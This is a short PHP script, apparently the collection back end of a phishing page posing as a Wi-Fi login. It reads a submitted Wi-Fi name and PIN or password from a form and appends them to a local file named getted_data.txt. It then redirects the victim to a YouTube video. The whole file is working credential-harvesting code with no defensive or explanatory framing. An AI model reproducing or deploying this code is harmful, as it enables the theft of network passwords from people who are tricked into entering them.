<?php

file_put_contents("getted_data.txt", "[WiFi-Name:] " . $userame = $_POST['username'] . " [pin/password:] " . $password = $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://youtu.be/MzfItGyy5Z4');
?>